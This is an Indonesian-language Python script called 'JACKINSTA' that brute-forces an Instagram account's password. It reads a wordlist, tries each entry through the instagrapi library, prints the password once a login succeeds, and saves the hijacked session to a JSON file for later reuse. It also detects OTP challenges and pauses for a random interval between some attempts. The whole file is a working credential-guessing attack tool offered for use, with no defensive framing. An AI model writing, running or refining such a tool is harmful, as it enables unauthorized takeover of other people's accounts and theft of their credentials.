from instagrapi import Client
import pyfiglet
import random
import time
import os

header = pyfiglet.figlet_format("JACKINSTA", font="standard")
print(header)
print("=" * 43 + "\n∥ INSTAGRAM BRUTE-FORCE & SESSION MANAGER ∥")
print("=" * 43)

username = input("Masukkan Username Instagram: ")
wordlist_file = input("Masukkan Daftar dalam bentuk File (ex: file.txt): ")

try:
  with open(wordlist_file, "r", encoding="utf-8") as file:
    list_password = [line.strip() for line in file.readlines() if line.strip()]
except FileNotFoundError:
  print(f"ERROR(!) — File {wordlist_file} tidak ditemukan.")
  exit()
session_file = f"session_{username}.json"

cl = Client()

print(f"""{"_ _" * 19}
Memproses...
{"‾ ‾" * 18}""")

if os.path.exists(session_file):
  print("❲#❳ Menggunakan File Sesi yang sudah ada.")
  try:
    cl.load_settings(session_file)
    cl.login(username, "")
    cl.get_timeline_feed()
    print("(θ) File Sesi digunakan.")
    exit()
  except Exception as e:
    print("(!) File Sesi tidak valid.")
    os.remove(session_file)
    print("=" * 50)

for password in list_password:
  print(f"Mengetes password: {password}")

  try:
    log_in = cl.login(username, password)
    if log_in:
      print(f"SELESAI! Passwordnya adalah: {password}")
      print("Menyimpan Sesi Login baru ke file...")
      cl.dump_settings(session_file)
      print(f"Berhasil menyimpan Sesi di file {session_file}")
      break
    
  except Exception as e:
    erroring = str(e).lower()
    if "bad_password" in erroring or "Kesalahan" in erroring:
      print("Respon Server: Password tidak diketahui.")
    elif "invalid_user" in erroring or "username" in erroring:
      print("Respon Server: Username tidak ditemukan.")
    elif "checkpoint" in erroring or "challenge" in erroring:
      print("ATTENTION!: Akun meminta kode OTP (SMS/Email).")
      break
    else:
      print(f"Respon Sistem: {e}")

      print("=" * 50)

      random_wait = random.randint(8, 31)
      print(f"Mengecek selama {random_wait} detik...")
      time.sleep(random_wait)
  
